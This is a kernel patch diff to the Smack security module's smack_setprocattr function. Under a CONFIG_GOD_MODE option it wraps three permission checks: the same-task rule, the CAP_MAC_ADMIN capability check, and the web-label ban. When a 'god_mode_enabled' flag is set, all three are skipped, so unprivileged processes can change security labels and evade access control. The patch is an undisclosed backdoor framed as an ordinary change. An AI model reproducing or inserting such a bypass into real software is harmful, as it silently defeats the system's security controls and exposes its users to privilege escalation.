@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  Simplified MAC Kernel (smack) security module
  *
@@ -2698,10 +2701,26 @@ static int smack_setprocattr(struct task_struct *p, char *name,
 	 * and supports no sane use case.
 	 */
 	if (p != current)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (value == NULL || size == 0 || size >= SMK_LABELLEN)
 		return -EINVAL;
@@ -2717,7 +2736,15 @@ static int smack_setprocattr(struct task_struct *p, char *name,
 	 * No process is ever allowed the web ("@") label.
 	 */
 	if (newsmack == smack_known_web.smk_known)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	oldtsp = p->cred->security;
 	new = prepare_creds();
